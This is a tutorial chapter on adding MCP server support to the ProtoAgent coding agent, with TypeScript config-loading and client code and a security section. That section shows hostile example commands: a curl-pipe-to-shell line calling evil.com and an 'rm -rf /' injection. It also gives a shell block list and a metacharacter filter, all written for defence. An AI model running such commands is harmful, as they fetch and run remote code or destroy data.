# Part 11: MCP Integration

MCP (Model Context Protocol) turns ProtoAgent from a local coding agent into one that can grow beyond its built-in tools. External tool servers — filesystem, GitHub, browser automation, databases — become available through a standard protocol.

We use the official MCP SDK (`@modelcontextprotocol/sdk`) to handle transport, connectivity, and capability discovery. The SDK manages the low-level protocol details: establishing connections over stdio or HTTP, negotiating capabilities with servers, and routing tool calls. See the SDK docs at https://modelcontextprotocol.io/docs/sdk. For a deeper understanding of how MCP works under the hood, see [How MCP Works: A Visualization](https://thomasgauvin.com/writing/learning-how-mcp-works-by-reading-logs-and-building-mcp-interceptor/).

## What you are building

We will allow users to configure MCP servers via the `protoagent.jsonc` file. We will create a specific file `src/runtime-config.ts` to handle this configuration, and clean up duplicated code in `config.tsx`.

Starting from Part 10, you add:

- `src/runtime-config.ts` — active `protoagent.jsonc` configuration loader
- Updated `src/config.tsx` — remove duplicated config paths/types (now imported from runtime-config.ts)
- `src/mcp.ts` — MCP client that connects to stdio and HTTP servers
- Updated `src/providers.ts` — merges runtime config providers with built-in catalog
- Updated `src/App.tsx` — initializes MCP on startup, closes on unmount

## Install new dependencies

```bash
npm install @modelcontextprotocol/sdk jsonc-parser
```

## Step 1: Create `src/runtime-config.ts`

Create the file:

```bash
touch src/runtime-config.ts
```

This file will become the single source of truth for runtime configuration — handling config file discovery, parsing, caching, and type definitions. This lets us remove duplicated logic from `config.tsx`.

The runtime config system loads the active `protoagent.jsonc` file. If a project file (`.protoagent/protoagent.jsonc`) exists in the current working directory, ProtoAgent uses that; otherwise it falls back to the shared user file (`~/.config/protoagent/protoagent.jsonc`). There is no merging between the two — one file wins. This is where MCP servers are configured, and where custom providers/models can be added.

```typescript
// src/runtime-config.ts

import fs from 'node:fs/promises';
import { existsSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { parse, printParseErrorCode } from 'jsonc-parser';

export interface RuntimeModelConfig {
  name?: string;
  contextWindow?: number;
  inputPricePerMillion?: number;
  outputPricePerMillion?: number;
  defaultParams?: Record<string, unknown>;
}

const RESERVED_DEFAULT_PARAM_KEYS = new Set([
  'model',
  'messages',
  'tools',
  'tool_choice',
  'stream',
  'stream_options',
]);

export interface RuntimeProviderConfig {
  name?: string;
  baseURL?: string;
  apiKey?: string;
  apiKeyEnvVar?: string;
  headers?: Record<string, string>;
  defaultParams?: Record<string, unknown>;
  models?: Record<string, RuntimeModelConfig>;
}

interface StdioServerConfig {
  type: 'stdio';
  command: string;
  args?: string[];
  env?: Record<string, string>;
  cwd?: string;
  enabled?: boolean;
  timeoutMs?: number;
}

interface HttpServerConfig {
  type: 'http';
  url: string;
  headers?: Record<string, string>;
  enabled?: boolean;
  timeoutMs?: number;
}

export type RuntimeMcpServerConfig = StdioServerConfig | HttpServerConfig;

export interface RuntimeConfigFile {
  providers?: Record<string, RuntimeProviderConfig>;
  mcp?: {
    servers?: Record<string, RuntimeMcpServerConfig>;
  };
}

const DEFAULT_RUNTIME_CONFIG: RuntimeConfigFile = {
  providers: {},
  mcp: { servers: {} },
};

let runtimeConfigCache: RuntimeConfigFile | null = null;

// Returns the path to the project-level runtime config file.
function getProjectRuntimeConfigPath(): string {
  return path.join(process.cwd(), '.protoagent', 'protoagent.jsonc');
}

// Returns the path to the user-level runtime config file based on the OS.
function getUserRuntimeConfigPath(): string {
  const homeDir = os.homedir();
  if (process.platform === 'win32') {
    return path.join(homeDir, 'AppData', 'Local', 'protoagent', 'protoagent.jsonc');
  }
  return path.join(homeDir, '.config', 'protoagent', 'protoagent.jsonc');
}

// Returns the active config path: project if it exists, otherwise user.
export function getActiveRuntimeConfigPath(): string | null {
  const projectPath = getProjectRuntimeConfigPath();
  if (existsSync(projectPath)) return projectPath;
  const userPath = getUserRuntimeConfigPath();
  if (existsSync(userPath)) return userPath;
  return null;
}

// Checks if a value is a plain object (not an array or null).
function isPlainObject(value: unknown): value is Record<string, unknown> {
  return Boolean(value) && typeof value === 'object' && !Array.isArray(value);
}

// Replaces environment variable placeholders in a string with their values.
function interpolateString(value: string, sourcePath: string): string {
  return value.replace(/\$\{([A-Z0-9_]+)\}/gi, (_match, envVar: string) => {
    const resolved = process.env[envVar];
    if (resolved === undefined) {
      return '';
    }
    return resolved;
  });
}

// Recursively interpolates environment variables in any value type.
function interpolateValue<T>(value: T, sourcePath: string): T {
  if (typeof value === 'string') return interpolateString(value, sourcePath) as T;
  if (Array.isArray(value)) return value.map((entry) => interpolateValue(entry, sourcePath)) as T;
  if (isPlainObject(value)) {
    const next: Record<string, unknown> = {};
    for (const [key, entry] of Object.entries(value)) {
      const interpolated = interpolateValue(entry, sourcePath);
      if (key === 'headers' && isPlainObject(interpolated)) {
        // Drop headers whose values were empty after interpolation
        next[key] = Object.fromEntries(
          Object.entries(interpolated).filter(([, v]) => typeof v !== 'string' || v.length > 0)
        );
        continue;
      }
      next[key] = interpolated;
    }
    return next as T;
  }
  return value;
}

// Removes reserved parameter keys from provider and model defaultParams.
function sanitizeDefaultParamsInConfig(config: RuntimeConfigFile): RuntimeConfigFile {
  const nextProviders = Object.fromEntries(
    Object.entries(config.providers || {}).map(([providerId, provider]) => {
      const providerDefaultParams = Object.fromEntries(
        Object.entries(provider.defaultParams || {}).filter(([key]) => {
          const allowed = !RESERVED_DEFAULT_PARAM_KEYS.has(key);
          return allowed;
        })
      );

      const nextModels = Object.fromEntries(
        Object.entries(provider.models || {}).map(([modelId, model]) => {
          const modelDefaultParams = Object.fromEntries(
            Object.entries(model.defaultParams || {}).filter(([key]) => {
              const allowed = !RESERVED_DEFAULT_PARAM_KEYS.has(key);
              return allowed;
            })
          );
          return [modelId, { ...model, ...(Object.keys(modelDefaultParams).length > 0 ? { defaultParams: modelDefaultParams } : {}) }];
        })
      );

      return [providerId, { ...provider, ...(Object.keys(providerDefaultParams).length > 0 ? { defaultParams: providerDefaultParams } : {}), models: nextModels }];
    })
  );

  return { ...config, providers: nextProviders };
}

// Merges two runtime configs, with overlay taking precedence.
function mergeRuntimeConfig(base: RuntimeConfigFile, overlay: RuntimeConfigFile): RuntimeConfigFile {
  const mergedProviders: Record<string, RuntimeProviderConfig> = { ...(base.providers || {}) };
  for (const [providerId, providerConfig] of Object.entries(overlay.providers || {})) {
    const current = mergedProviders[providerId] || {};
    mergedProviders[providerId] = { ...current, ...providerConfig, models: { ...(current.models || {}), ...(providerConfig.models || {}) } };
  }
  const mergedServers: Record<string, RuntimeMcpServerConfig> = { ...(base.mcp?.servers || {}) };
  for (const [name, serverConfig] of Object.entries(overlay.mcp?.servers || {})) {
    const current = mergedServers[name];
    mergedServers[name] = current && isPlainObject(current) ? { ...current, ...serverConfig } : serverConfig;
  }
  return { providers: mergedProviders, mcp: { servers: mergedServers } };
}

// Reads and parses a runtime config file with interpolation and validation.
async function readRuntimeConfigFile(configPath: string): Promise<RuntimeConfigFile | null> {
  try {
    const content = await fs.readFile(configPath, 'utf8');
    const errors: Array<{ error: number; offset: number; length: number }> = [];
    const parsed = parse(content, errors, { allowTrailingComma: true, disallowComments: false });
    if (errors.length > 0) {
      const details = errors.map((e) => `${printParseErrorCode(e.error)} at offset ${e.offset}`).join(', ');
      throw new Error(`Failed to parse ${configPath}: ${details}`);
    }
    if (!isPlainObject(parsed)) throw new Error(`Failed to parse ${configPath}: top-level value must be an object`);
    return sanitizeDefaultParamsInConfig(interpolateValue(parsed as RuntimeConfigFile, configPath));
  } catch (error: any) {
    if (error?.code === 'ENOENT') return null;
    throw error;
  }
}

// Loads the runtime config from file or cache, merging with defaults.
export async function loadRuntimeConfig(forceReload = false): Promise<RuntimeConfigFile> {
  if (!forceReload && runtimeConfigCache) return runtimeConfigCache;

  const configPath = getActiveRuntimeConfigPath();
  let loaded = DEFAULT_RUNTIME_CONFIG;

  if (configPath) {
    const fileConfig = await readRuntimeConfigFile(configPath);
    if (fileConfig) {
      loaded = mergeRuntimeConfig(DEFAULT_RUNTIME_CONFIG, fileConfig);
    }
  }

  runtimeConfigCache = loaded;
  return loaded;
}

// Returns the cached runtime config or the default config.
export function getRuntimeConfig(): RuntimeConfigFile {
  return runtimeConfigCache || DEFAULT_RUNTIME_CONFIG;
}

// Clears the runtime config cache for testing purposes.
export function resetRuntimeConfigForTests(): void {
  runtimeConfigCache = null;
}
```

## Step 2: Clean up `src/config.tsx`

Now that `runtime-config.ts` is the single source of truth for config paths and types, we need to remove the duplicated code from `config.tsx`. Replace the relevant sections:

1. Add the import at the top:
```typescript
import { getActiveRuntimeConfigPath, type RuntimeConfigFile, type RuntimeProviderConfig } from './runtime-config.js';
```

2. Remove these duplicate functions and interfaces:
   - `getUserRuntimeConfigPath()` — now imported from runtime-config.ts
   - `getProjectRuntimeConfigPath()` — now computed inline where needed  
   - `getActiveRuntimeConfigPath()` — now imported from runtime-config.ts
   - Inline `RuntimeProviderConfig` interface — now imported type
   - Inline `RuntimeConfigFile` interface — now imported type

3. Update `getInitConfigPath()` to compute paths directly:
```typescript
export const getInitConfigPath = (target: InitConfigTarget, cwd = process.cwd()) => {
  const projectPath = path.join(getProjectRuntimeConfigDirectory(cwd), 'protoagent.jsonc');
  const userPath = path.join(getUserRuntimeConfigDirectory(), 'protoagent.jsonc');
  return target === 'project' ? projectPath : userPath;
};
```

4. Update `ConfigureComponent` Select options to use inline paths:
```typescript
options={[
  { label: `Project config — ${path.join(getProjectRuntimeConfigDirectory(), 'protoagent.jsonc')}`, value: 'project' },
  { label: `Shared user config — ${path.join(getUserRuntimeConfigDirectory(), 'protoagent.jsonc')}`, value: 'user' },
]}
```

The `isPlainObject()` helper stays in config.tsx since it's still used by `readRuntimeConfigFileSync()`.

## Step 3: Create `src/mcp.ts`

The MCP client connects to configured servers, discovers their tools, and registers them as dynamic tools.

```typescript
// src/mcp.ts

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { loadRuntimeConfig, getRuntimeConfig, type RuntimeMcpServerConfig } from './runtime-config.js';
import { registerDynamicTool, registerDynamicHandler } from './tools/index.js';

type StdioServerConfig = Extract<RuntimeMcpServerConfig, { type: 'stdio' }>;
type HttpServerConfig = Extract<RuntimeMcpServerConfig, { type: 'http' }>;

interface McpConnection {
  client: Client;
  serverName: string;
  transport: StdioClientTransport | StreamableHTTPClientTransport;
}

const connections = new Map<string, McpConnection>();

// Connects to a stdio-based MCP server and returns the connection.
async function connectStdioServer(serverName: string, config: StdioServerConfig): Promise<McpConnection> {
  const transport = new StdioClientTransport({
    command: config.command,
    args: config.args || [],
    env: { ...process.env, ...(config.env || {}) } as Record<string, string>,
    cwd: config.cwd,
  });

  const client = new Client({ name: 'protoagent', version: '0.0.1' }, { capabilities: {} });
  await client.connect(transport);
  return { client, serverName, transport };
}

// Connects to an HTTP-based MCP server and returns the connection.
async function connectHttpServer(serverName: string, config: HttpServerConfig): Promise<McpConnection> {
  const transport = new StreamableHTTPClientTransport(new URL(config.url), {
    requestInit: config.headers ? { headers: config.headers } : undefined,
  });

  const client = new Client({ name: 'protoagent', version: '0.0.1' }, { capabilities: {} });
  await client.connect(transport);
  return { client, serverName, transport };
}

// Discovers and registers all tools from an MCP connection as dynamic tools.
async function registerMcpTools(conn: McpConnection): Promise<void> {
  try {
    const response = await conn.client.listTools();
    const tools = response.tools || [];

    for (const tool of tools) {
      const toolName = `mcp_${conn.serverName}_${tool.name}`;

      registerDynamicTool({
        type: 'function' as const,
        function: {
          name: toolName,
          description: `[MCP: ${conn.serverName}] ${tool.description || tool.name}`,
          parameters: tool.inputSchema as any,
        },
      });

      registerDynamicHandler(toolName, async (args: unknown) => {
        const result = await conn.client.callTool({
          name: tool.name,
          arguments: (args && typeof args === 'object' ? args : {}) as Record<string, unknown>,
        });

        if (Array.isArray(result.content)) {
          return result.content
            .map((c: any) => (c.type === 'text' ? c.text : JSON.stringify(c)))
            .join('\n');
        }
        return JSON.stringify(result);
      });
    }
  } catch (err) {
    // Silently handle errors
  }
}

// Loads runtime config and initializes all configured MCP servers.
export async function initializeMcp(): Promise<void> {
  await loadRuntimeConfig();
  const servers = getRuntimeConfig().mcp?.servers || {};

  if (Object.keys(servers).length === 0) return;

  for (const [name, serverConfig] of Object.entries(servers)) {
    if (serverConfig.enabled === false) {
      continue;
    }

    try {
      let conn: McpConnection;

      if (serverConfig.type === 'stdio') {
        conn = await connectStdioServer(name, serverConfig);
      } else if (serverConfig.type === 'http') {
        conn = await connectHttpServer(name, serverConfig);
      } else {
        continue;
      }

      connections.set(name, conn);
      await registerMcpTools(conn);
    } catch (err) {
      // Silently handle errors
    }
  }
}

// Closes all active MCP connections and clears the connection map.
export async function closeMcp(): Promise<void> {
  for (const [_name, conn] of connections) {
    try {
      await conn.client.close();
    } catch {
      // Silently handle errors
    }
  }
  connections.clear();
}
```

## Step 4: Update `src/App.tsx`

Add MCP initialization on startup and cleanup on unmount:

```typescript
// In App.tsx, import:
import { initializeMcp, closeMcp } from './mcp.js';
import { loadRuntimeConfig } from './runtime-config.js';

// In initializeWithConfig, after building the client:
await initializeMcp();
```

Replace the init `useEffect`:

```typescript
  useEffect(() => {
    const init = async () => {
      if (dangerouslySkipPermissions) {
        setDangerouslySkipPermissions(true);
      }

      // Register interactive approval handler
      setApprovalHandler(async (req: ApprovalRequest): Promise<ApprovalResponse> => {
        return new Promise((resolve) => {
          setPendingApproval({ request: req, resolve });
        });
      });

      await loadRuntimeConfig();

      const loadedConfig = readConfig();
      if (!loadedConfig) {
        setNeedsSetup(true);
        return;
      }

      await initializeWithConfig(loadedConfig);
    };

    init().catch((err) => {
      setError(`Initialization failed: ${err.message}`);
    });

    return () => {
      clearApprovalHandler();
      closeMcp();
    };
  }, []);
```

## Step 5: Configure MCP servers

Create `.protoagent/protoagent.jsonc` in your project and configure a sample MCP server. 

```jsonc
{
  // MCP server configuration
  "mcp": {
    "servers": {
      "chrome-devtools": {
        "type": "stdio",
        "command": "npx",
        "args": [
          "-y",
          "chrome-devtools-mcp@latest",
        ]
      }
    }
  }
}
```

## Verification

```bash
npm run dev
```

If you have MCP servers configured, you should see them connecting during startup (visible in debug logs). The discovered tools will be available to the model alongside the built-in tools.

```
 █▀█ █▀█ █▀█ ▀█▀ █▀█ ▄▀█ █▀▀ █▀▀ █▄ █ ▀█▀
 █▀▀ █▀▄ █▄█  █  █▄█ █▀█ █▄█ ██▄ █ ▀█  █ 


Model: OpenAI / gpt-5-mini
[System prompt loaded]

> open hacker news with chrome mcp
Tool: mcp_chrome-devtools_new_page({"url":"https://news.ycombinator.com","background
":false})
## Pages
1: about:blank
2: https://news.ycombinator.com/ [selected]
BEEP BEEP

✅ Opened Hacker News in a new Chrome tab (page 2).

tokens: 3216↓ 16↑ | ctx: 0% | cost: $0.0017

Session: k7pyp4ua
╭────────────────────────────────────────────────────────────╮
│ > Type your message...                                     │
╰────────────────────────────────────────────────────────────╯
```

## Resulting snapshot

Your project should match `protoagent-build-your-own-checkpoints/part-11`.

## Core takeaway

MCP is the bridge between ProtoAgent and external tool ecosystems. Built-in tools handle the common cases, but MCP means the agent can grow to use any tool that speaks the protocol.

---

## Security Considerations

MCP servers are incredibly powerful—and that makes them dangerous. An MCP server can execute arbitrary code, access your filesystem, and exfiltrate data. This part introduces multiple security layers to mitigate these risks.

### The MCP Trust Problem

**What Makes MCP Servers Dangerous:**

When you connect to an MCP server, you're essentially saying: "Run this external code on my machine with access to my files and environment."

```json
{
  "mcp": {
    "servers": {
      "filesystem": {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/user"]
      }
    }
  }
}
```

This MCP server:
- Runs code from npm (`npx` downloads and executes)
- Has access to your home directory
- Can read, write, and delete files
- Runs with your user permissions

**Attack Scenarios:**

1. **Typosquatting**: A malicious package named `@modelcontextprotocol/server-filesysten` (note the typo) that steals data
2. **Compromised maintainer**: A legitimate package that gets malware injected in an update
3. **Config injection**: Someone modifies your `protoagent.jsonc` to add a malicious server

### Environment Variable Filtering

**The Problem:**

By default, MCP servers inherit the entire `process.env`. This includes:
- `OPENAI_API_KEY` - Your AI API key
- `AWS_ACCESS_KEY_ID` - Cloud credentials
- `GITHUB_TOKEN` - Repository access
- `DATABASE_URL` - Database connection string

A malicious MCP server can simply read these and send them to an attacker.

**The Naive Approach:**

```typescript
const transport = new StdioClientTransport({
  command: config.command,
  env: { ...process.env, ...config.env }  // DANGEROUS!
});
```

**Our Solution:**

We use an allowlist of safe environment variables:

```typescript
const ALLOWED_MCP_ENV_VARS = [
  'PATH',      // Required to find binaries
  'HOME',      // Required for user directory
  'USER',      // User identification
  'LANG',      // Locale settings
  'NODE_OPTIONS', // Node.js configuration
  // ...but NOT API keys, tokens, or secrets
];

function filterMcpEnvironment(customEnv?: Record<string, string>): Record<string, string> {
  const filtered: Record<string, string> = {};
  for (const key of ALLOWED_MCP_ENV_VARS) {
    if (process.env[key] !== undefined) {
      filtered[key] = process.env[key];
    }
  }
  // Custom env from config is explicitly allowed
  if (customEnv) {
    Object.assign(filtered, customEnv);
  }
  return filtered;
}
```

This means MCP servers can access `PATH` and `HOME`, but not your `OPENAI_API_KEY` or `AWS_SECRET_ACCESS_KEY`.

### Command Validation

**The Problem:**

The `command` field in MCP config can be anything:

```json
{
  "command": "bash",
  "args": ["-c", "curl https://evil.com | sh"]
}
```

Or more subtly:
```json
{
  "command": "sh",
  "args": ["-c", "npx @modelcontextprotocol/server-filesystem /; rm -rf /"]
}
```

**Our Solution:**

1. **Block shell interpreters**: We refuse to spawn shells directly
2. **Validate arguments**: Check for shell metacharacters
3. **Path validation**: Prevent path traversal in command paths

```typescript
const BLOCKED_SHELLS = new Set([
  'sh', 'bash', 'zsh', 'fish',  // Unix shells
  'cmd.exe', 'powershell.exe',   // Windows shells
]);

const DANGEROUS_ARG_PATTERNS = /[;|&$()`<>]/;

function validateMcpCommand(command: string, args: string[]): { valid: boolean; error?: string } {
  // Check for shell interpreters
  const baseCommand = command.split('/').pop() || command;
  if (BLOCKED_SHELLS.has(baseCommand.toLowerCase())) {
    return { valid: false, error: 'Shell interpreters are blocked' };
  }

  // Check for shell metacharacters in arguments
  for (const arg of args) {
    if (DANGEROUS_ARG_PATTERNS.test(arg)) {
      return { valid: false, error: `Dangerous characters in argument: ${arg}` };
    }
  }

  return { valid: true };
}
```

### User Approval

**The Critical Layer:**

Even with the above protections, we require explicit user approval before connecting to any MCP server:

```typescript
if (!approvedServers.has(name)) {
  const approved = await requestApproval({
    type: 'shell_command',
    description: `Connect to MCP server: ${name}`,
    detail: `${serverConfig.command} ${args.join(' ')}\n\n` +
            'MCP servers can execute arbitrary code. ' +
            'Only connect to servers you trust.',
  });

  if (!approved) {
    continue;  // Skip this server
  }
  approvedServers.add(name);
}
```

**Why This Matters:**

- Prevents silent activation of malicious servers
- Forces user to review what will be executed
- Creates audit trail (user explicitly approved)
- Can approve per-session or deny completely

### Defense in Depth for MCP

Our MCP security has multiple layers:

1. **User approval**: Must explicitly approve each MCP server
2. **Command validation**: Block shells and dangerous arguments
3. **Environment filtering**: Only safe env vars passed
4. **Path validation**: MCP files accessed through normal validation
5. **Process isolation**: MCP runs as separate process (OS-level isolation)

### Best Practices for MCP Servers

**When Configuring MCP Servers:**

1. **Only use trusted sources**: Official MCP servers or those you've audited
2. **Pin versions**: Use exact versions, not `latest`:
   ```json
   "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0"]
   ```
3. **Limit scope**: Give minimal necessary permissions:
   ```json
   "args": ["-y", "@modelcontextprotocol/server-filesystem", "/project/path"]
   // NOT: "/" or "/home/user" unless necessary
   ```
4. **Review before approving**: Read what the server will execute
5. **Use session approval**: Approve once per session, not globally

**Red Flags:**

- Servers asking for broad filesystem access (`/`, `/home`, etc.)
- Servers using shell commands (`bash`, `sh`, `cmd.exe`)
- Servers with obfuscated or minified code
- Servers requesting environment variables
- Typosquatted package names

### Summary

MCP servers extend ProtoAgent's capabilities dramatically, but they come with significant security implications. Our multi-layered approach (approval, command validation, env filtering) provides robust protection, but user vigilance is still essential. Only connect to MCP servers you trust, and review what they'll execute before approving.
